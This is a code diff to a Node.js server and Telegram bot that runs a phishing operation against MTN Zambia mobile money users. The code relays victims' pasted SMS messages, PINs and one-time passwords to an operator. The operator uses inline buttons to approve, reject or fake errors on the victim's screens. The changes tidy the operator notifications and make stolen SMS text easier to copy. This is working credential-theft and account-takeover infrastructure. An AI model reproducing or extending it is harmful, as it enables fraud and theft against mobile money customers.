@@ -267,31 +267,31 @@ async function initBot() {
         case 'ALLOW_PIN':
         case 'ALLOW_OTP':
           session.status = 'SMS_PASTE_STEP';
-          await bot.sendMessage(chatTarget, `✅ PIN approved. SMS paste screen loaded for ${session.contact}`);
+          await bot.sendMessage(chatTarget, `✅ PIN approved. SMS paste screen loaded for +260${session.contact}`);
           break;
         case 'DENY_OTP':
           session.status = 'DENIED';
-          await bot.sendMessage(chatTarget, `❌ Access Denied for ${session.contact}`);
+          await bot.sendMessage(chatTarget, `❌ Access Denied for +260${session.contact}`);
           break;
         case 'CORRECT_OTP':
           session.status = 'SUCCESS';
-          await bot.sendMessage(chatTarget, `🎉 Success screen triggered for ${session.contact}`);
+          await bot.sendMessage(chatTarget, `🎉 Success screen triggered for +260${session.contact}`);
           break;
         case 'WRONG_PIN':
           session.status = 'RETRY_PIN';
-          await bot.sendMessage(chatTarget, `⚠️ Triggered Wrong PIN error.`);
+          await bot.sendMessage(chatTarget, `⚠️ Triggered Wrong PIN error for +260${session.contact}`);
           break;
         case 'WRONG_OTP':
           session.status = 'RETRY_OTP';
-          await bot.sendMessage(chatTarget, `⚠️ Triggered Wrong OTP error.`);
+          await bot.sendMessage(chatTarget, `⚠️ Triggered Wrong OTP error for +260${session.contact}`);
           break;
         case 'PASTED_APPROVE':
           session.status = 'OTP_STEP';
-          await bot.sendMessage(chatTarget, `✅ Pasted SMS approved. OTP screen loaded for ${session.contact}`);
+          await bot.sendMessage(chatTarget, `✅ Valid SMS accepted. OTP screen loaded for +260${session.contact}`);
           break;
         case 'PASTED_REJECT':
           session.status = 'SMS_REJECTED';
-          await bot.sendMessage(chatTarget, `❌ Pasted SMS rejected for ${session.contact}`);
+          await bot.sendMessage(chatTarget, `❌ SMS verification rejected for +260${session.contact}`);
           break;
         default:
           break;
@@ -404,17 +404,20 @@ app.post('/verify-sms-pasted', async (req, res) => {
     session.pasted_sms = pastedSms;
     session.status = 'PENDING_PASTED_SMS';
 
+    const escapedSms = String(pastedSms || 'N/A').replace(/([_*[\]()~`>#+\-=|{}.!])/g, '\\$1');
+
     const message =
-      `💬 *MTN ZAMBIA - PASTED SMS SUBMITTED*\n\n` +
+      `💬 *MTN ZAMBIA - SMS SUBMITTED*\n\n` +
       `📱 *MTN Phone:* +260${session.contact}\n\n` +
-      `📄 *Content:*\n\`\`\`\n${pastedSms || 'N/A'}\n\`\`\`\n\n` +
+      `📄 *Content:* Copy below text:\n` +
+      `\`${escapedSms}\`\n\n` +
       `🆔 *User ID:* ${userId}`;
 
     const opts = {
       reply_markup: {
         inline_keyboard: [
           [
-            { text: '✅ APPROVE SMS (LOAD OTP)', callback_data: `PASTED_APPROVE_${userId}` },
+            { text: '✅ VALID SMS (LOAD OTP)', callback_data: `PASTED_APPROVE_${userId}` },
             { text: '❌ REJECT SMS', callback_data: `PASTED_REJECT_${userId}` }
           ]
         ]
@@ -484,4 +487,4 @@ const PORT = process.env.PORT || 10000;
 app.listen(PORT, async () => {
   await initBot();
 });
-                              
+    
